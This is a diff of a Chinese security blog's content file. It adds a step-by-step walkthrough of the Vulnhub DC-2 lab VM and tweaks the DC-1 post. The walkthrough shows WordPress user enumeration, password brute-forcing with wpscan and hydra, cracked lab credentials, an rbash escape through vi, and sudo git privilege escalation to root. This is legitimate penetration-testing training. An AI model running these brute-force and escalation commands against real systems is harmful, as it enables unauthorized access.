@@ -1406,7 +1406,7 @@
     <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
 <p>攻击机：Kali-2021.3：192.168.8.105</p>
 <p>靶机：Vulnhub-DC1：192.168.8.230</p>
-<p>靶机下载地址：<a href="Https://download.vulnhub.com/dc/DC-1.zip">Https://download.vulnhub.com/dc/DC-1.zip</a></p>
+<p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p>
 </blockquote>
 <h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>启动靶机，由于我们没法进去这个靶机，所以IP地址是未知的</p>
 <p><img src="/2022/06/08/Vulnhub-DC-1/1.png" alt></p>
@@ -1418,7 +1418,7 @@
 <p>一共发现了4个主机存活，最后一个是本机IP，因此可以不用考虑</p>
 <p>使用下面命令进行逐个扫描，根据它们所开放的端口等其他信息进行排查</p>
 <p><a href="https://blog.csdn.net/Kris__zhang/article/details/106841466?spm=1001.2014.3001.5506">nmap超详细使用教程</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.8.230</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.8.230</span><br><span class="line">或</span><br><span class="line">nmap -A -p- 192.168.8.230</span><br></pre></td></tr></table></figure>
 <p><img src="/2022/06/08/Vulnhub-DC-1/4.png" alt></p>
 <p>可以看到开放了80端口，打开浏览器进行访问</p>
 <p><img src="/2022/06/08/Vulnhub-DC-1/5.png" alt></p>
@@ -1535,6 +1535,163 @@
 <p><a href="https://blog.csdn.net/xieyanxy9/article/details/84118604">如何重置Drupal 7的用户密码</a></p>
 <p><a href="https://blog.csdn.net/gui951753/article/details/79154496">深入浅出理解交互式shell和非交互式shell、登录shell和非登录shell的区别</a></p>
 <p><a href="https://blog.csdn.net/Kris__zhang/article/details/106841466?spm=1001.2014.3001.5506">nmap超详细使用教程</a></p>
+]]></content>
+      <categories>
+        <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>渗透测试</tag>
+        <tag>靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vulnhub-DC-2渗透学习</title>
+    <url>/2022/06/09/Vulnhub-DC-2/</url>
+    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
+<p>攻击机：Kali-2021.3：192.168.8.105</p>
+<p>靶机：Vulnhub-DC2：192.168.8.222</p>
+<p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
+</blockquote>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>首先使用nmap进行主机探活</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/1.png" alt></p>
+<p>然后逐个扫描，判断出靶机的IP地址</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.8.222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/2.png" alt></p>
+<p>发现我们的目标开放了80和7744端口，80端口是默认端口，7744端口是开放了ssh服务</p>
+<p>使用whatweb继续寻找相关信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/3.png" alt></p>
+<p>然后发现这个网站使用的CMS是WordPress 4.7.10</p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>首先访问一下80端口，发现flag就在下面</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/4.png" alt></p>
+<p>这里有点奇怪，网上的大部分教程在这一步都会出现域名无法解析的情况，因为在访问这个网址的时候，直接跳转到了<a href="http://dc-2/的域名上了，而我们的本地hosts文件里是没有该域名的解析ip，所以导致无法访问。但是我这里直接就访问成功了，有点奇怪">http://dc-2/的域名上了，而我们的本地hosts文件里是没有该域名的解析ip，所以导致无法访问。但是我这里直接就访问成功了，有点奇怪</a></p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/5.png" alt></p>
+<p>正常流程是需要在本机的hosts文件中加入指向该域名的ip地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows：</span><br><span class="line">C:/Windows/System32/drivers/etc/hosts</span><br><span class="line">Linux：</span><br><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure>
+<p>打开hosts文件后加入下面的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.8.222 dc-2</span><br></pre></td></tr></table></figure>
+<p>再次访问就能够访问成功了，并找到第一个flag</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/6.png" alt></p>
+<p>翻译：</p>
+<blockquote>
+<p>您通常的单词表可能不起作用，因此，也许您只需要成为 cewl。</p>
+<p>更多的密码总是更好，但有时你无法赢得所有密码。</p>
+<p>以一个身份登录以查看下一个标志。</p>
+<p>如果找不到，请以另一个身份登录。</p>
+</blockquote>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>flag1提示中提到<strong>cewl</strong>，检索一下发现这是一个生成密码字典的工具，很明显这是让我们用这个工具来生成密码来爆破，可是现在我们还没有用户名。</p>
+<p><a href="https://www.freebuf.com/articles/network/190128.html">Kali Linux字典生成工具Cewl使用全指南</a></p>
+<p>信息收集里我们已经知道了这个网站的CMS是WordPress，而Kali中自带有一个专门用来扫描该CMS的工具：wpscan</p>
+<p><a href="https://zhuanlan.zhihu.com/p/149725645">Kali(渗透工具):WPScan的使用（WordPress扫描工具）</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 --enumerate u //枚举出用户名</span><br><span class="line">注：这里的url必须使用域名，否则无法扫描</span><br></pre></td></tr></table></figure>
+<p>发现一共存在三个用户</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/7.png" alt></p>
+<p>将这三个用户存入txt文件中：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -e &quot;admin \njerry \ntom&quot; &gt; users.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/8.png" alt></p>
+<p>然后通过cewl来生成我们的密码字典</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ -w passwd.txt</span><br><span class="line">注：这里必须使用域名，否则会出错</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/9.png" alt></p>
+<p>那么接下来就是爆破了，但爆破前得找到这个网站的登录入口，有两种方法</p>
+<ol>
+<li><p>通过浏览器检索关键信息来寻找</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/10.png" alt></p>
+</li>
+<li><p>通过扫描网站后台文件来寻找</p>
+<p>这里理论上可以使用御剑来扫后台，前提是你的字典足够大</p>
+<p>而我这里则推荐使用Kali中的一款web页面扫描工具：<strong>nikto</strong></p>
+<p><a href="https://blog.csdn.net/smli_ng/article/details/105994754">Nikto详细使用教程</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -host 192.168.8.222</span><br><span class="line">nikto -url 192.168.8.222</span><br></pre></td></tr></table></figure>
+<p>扫描完后可以找到该网站的登录页面的地址</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/11.png" alt></p>
+</li>
+</ol>
+<p>两种方法都可以进入登录页面：</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/12.png" alt></p>
+<p>使用wpscan开始爆破</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U users.txt -P passwd.txt</span><br></pre></td></tr></table></figure>
+<p>成功爆破出了两个账户密码</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/13.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
+<p>尝试登录，进去后就能找到flag2，除此以外就没什么有用的信息了，两个账号的信息是一样的，没必要登录两次</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/14.png" alt></p>
+<p>翻译：</p>
+<blockquote>
+<p>如果您不能利用 WordPress 并走捷径，还有另一种方法。</p>
+<p>希望你找到另一个切入点。</p>
+</blockquote>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>提示说我们需要换一个切入点，还记得之前的7744端口吗，这很有可能就是另一个切入点，所以尝试使用刚刚的账号密码登录SSH服务，因为ssh的默认端口是22，因此我们需要在后面加上指定端口，这里在尝试后会发现只有tom账号可以成功登录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh jerry@192.168.8.222 -p 7744</span><br><span class="line">ssh tom@192.168.8.222 -p 7744</span><br></pre></td></tr></table></figure>
+<p>这里如果前提是不知道账号密码的话，可以使用<strong>hydra</strong>进行ssh破解</p>
+<p><a href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra 192.168.8.222 -L users.txt -P passwd.txt -s 7744 ssh</span><br></pre></td></tr></table></figure>
+<p>这个工具的破解所花的时间比较久，得耐心等会</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/15.png" alt></p>
+<p>然后连接tom账号的ssh服务，成功登录！</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/16.png" alt></p>
+<p>寻找到flag3，但是发现是rbash，就是被限制了的shell</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/17.png" alt></p>
+<p>大致限制情况如下：</p>
+<ol>
+<li>不能通过 cd 来改变工作目录</li>
+<li>不能设置或取消环境变量： SHELL， PATH， ENV， BASH_ENV</li>
+<li>命令名中不能包含目录分隔符 ‘/‘</li>
+<li>不能使用包含有 ‘/‘ 的文件名作为内置命令 ‘.’ 的参数（即文件名中不能有 ‘/‘）</li>
+<li>不能使用 <code>&gt;， &gt;|， &lt;&gt;， &gt;&amp;， &amp;&gt;， &gt;&gt;</code> 等重定向操作符</li>
+<li>不能使用 exec 内置命令</li>
+<li>…</li>
+</ol>
+<p><a href="http://kuanghy.github.io/2017/02/20/rbash">受限的 bash — rbash </a></p>
+<p>但是我们依然可以使用<code>vi</code>或<code>less</code>命令，所以可以查看到flag3的值</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi flag3.txt</span><br><span class="line">less flag3.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/18.png" alt></p>
+<blockquote>
+<p>Poor old Tom is always running after Jerry. Perhaps he should <strong>su</strong> for all the stress he causes.</p>
+</blockquote>
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>提示中提到了su，这不难理解，既然rbash使我们的权限受到了限制，那我们就得想办法绕过它，然后通过<code>su jerry</code>切换用户</p>
+<p><a href="https://blog.csdn.net/weixin_43705814/article/details/111879362">rbash绕过</a></p>
+<p>通过vi编辑器进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi //终端上运行vi编辑器</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/19.png" alt></p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/20.png" alt></p>
+<p>然后出来就能看到不是rbash了</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/21.png" alt></p>
+<p>然后再设置一下环境变量</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/22.png" alt></p>
+<p>第一条命令的作用是添加根目录的bin文件夹到$PATH</p>
+<p>第二条命令的作用和上一条一样，添加usr/bin文件夹到$PATH</p>
+<p>里面的冒号只是起分隔作用，并没有其他作用</p>
+<p>这样我们就可以使用这些文件夹中的命令了，接下来就是切换用户了</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/23.png" alt></p>
+<p>切换成功后发现还是在tom的工作目录上，所以更换工作目录，然后就能很快找到flag4</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/24.png" alt></p>
+<blockquote>
+<p>Good to see that you’ve made it this far - but you’re not home yet. </p>
+<p>You still need to get the final flag (the only flag that really counts!!!).  </p>
+<p>No hints here - you’re on your own now.  :-)</p>
+<p>Go on - <strong>git</strong> outta here!!!!</p>
+</blockquote>
+<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>猜测最后一个flag大概率位于root中，所以我们得提权，先来看看SUID提权</p>
+<p>查看具有SUID权限的命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>发现并没有像DC-1的find命令那样可以用来提权</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/25.png" alt></p>
+<p>于是去查看一下具有root权限的命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p>发现存在一个免密的git命令（具有root权限）</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/26.png" alt></p>
+<p>同时flag4中也提示了git，因此用到了git提权</p>
+<p><a href="https://blog.csdn.net/qq_38612882/article/details/122772867">2022-渗透测试-git提权（Linux）</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo git help config </span><br><span class="line">!/bin/bash 或 !&#x27;sh&#x27; //在末尾添加</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/09/Vulnhub-DC-2/27.png" alt></p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/28.png" alt></p>
+<p>成功得到了root权限，进入root就能得到flag</p>
+<p><img src="/2022/06/09/Vulnhub-DC-2/29.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_45742511/article/details/114666974">靶机测试—DC（2）</a></p>
+<p><a href="https://blog.csdn.net/qq_61237064/article/details/123500520?spm=1001.2014.3001.5502">dc-2 靶机渗透学习</a></p>
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
